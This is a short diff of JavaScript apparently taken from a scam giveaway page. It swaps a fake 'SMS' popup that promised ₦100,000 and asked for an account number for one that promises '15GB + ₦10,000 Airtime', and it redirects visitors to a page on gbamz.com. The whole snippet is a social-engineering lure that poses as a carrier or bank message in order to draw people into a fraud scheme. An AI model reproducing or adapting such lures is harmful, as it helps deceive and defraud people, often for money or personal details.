@@ -1,5 +1,5 @@
-var password = 'WITHDRAW ₦100,000'
-password=prompt('SMS: Congratulations, you are eligible to receive ₦100,000, click OK to Enter Account Number','WITHDRAW ₦100,000');
-if (password != 'WITHDRAW ₦100,000') {
+var password = '15GB + ₦10,000 Airtime'
+password=prompt('SMS: Congratulations, your Mobile Number is eligible to receive 15GB + ₦10,000 Airtime, click OK to Activate now','15GB + ₦10,000 Airtime');
+if (password != '15GB + ₦10,000 Airtime') {
 location.href='https://gbamz.com/don-birthday.html';
 }
